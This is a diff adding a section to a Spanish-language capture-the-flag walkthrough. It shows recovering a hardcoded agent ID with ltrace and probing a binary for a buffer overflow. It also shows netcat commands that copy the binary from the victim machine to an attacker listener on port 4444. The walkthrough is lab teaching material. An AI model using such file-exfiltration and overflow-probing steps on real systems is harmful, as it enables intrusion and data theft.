@@ -221,6 +221,89 @@ export SHELL=bash
 
 - Tenemos la quinta flag que la decodificamos 
 
+![image](https://github.com/user-attachments/assets/eab24071-ee97-45e1-907c-c4bccc25a09f)
+![image](https://github.com/user-attachments/assets/a7e1366d-f63c-4d03-9152-6cca1623eabd)
+
+- Viendo los **puertos abiertos** con `netstat -nat` que hay en la máquinas observamos uno poco común que es el `7788`
+	- Nos tratamos de conectar y nos pide in **Agent ID** que no tenemos, buscamos el binario en donde se almacenaba y lo encontramos
+
+![image](https://github.com/user-attachments/assets/1f8be6de-d2e7-41d7-91f8-c7308ed3dab5)
+
+- Ahora jugamos con `ltrace` para que ver que es lo que pasa cuando ejecutamos el binario `agent` y vemos que lo compara con **strncompare** de esto `48093572` 
+
+![image](https://github.com/user-attachments/assets/7904baad-2ced-4e86-b19f-dc39e63a2698)
+
+- Observamos que si funcionó el **ID**, ahora investigando vemos que la **opción 3** nos devuelve la cadena que pongamos.
+	- Por lo tanto vamos probar a meterle muchas **"A"** y  vemos que dice **segmentation fault**, por lo tanto se ha aplicado un desbordamiento del Buffer asique podemos pensar en **Buffer Overflow**
+
+![image](https://github.com/user-attachments/assets/07818dbf-b979-4b88-ab91-adb3fc538118)
+
+# Buffer Overflow
+
+- Como vimos tenemos el binario **Agent**  que si ponemos muchas "**A**" nos va a dar error ya que esta programado para una cierta cantidad de bytes
+
+![image](https://github.com/user-attachments/assets/eb5545bd-ba74-4491-b76e-5d66156c6b80)
+
+- Una ves visto eso, lo que hacemos ahora es pasarnos el **binario Agent** a nuestra máquina de atacante y poder jugar con **GDB-GEF** 
+
+```bash
+#Máquina atacante
+nc -nlvp 4444 > agent
+
+#Máquina víctima
+cd /usr/local/bin
+nc ip 4444 < agent
+```
+
+- Ahora con ``md5sum`` comprobamos el hash para **ver si son iguales** por si hubo alguna corrupción pero vemos que no
+
+![image](https://github.com/user-attachments/assets/05d401a8-b45f-4e30-85f0-05b82e94d022)
+![image](https://github.com/user-attachments/assets/212da93e-7a31-491b-90a9-87479336a4d1)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
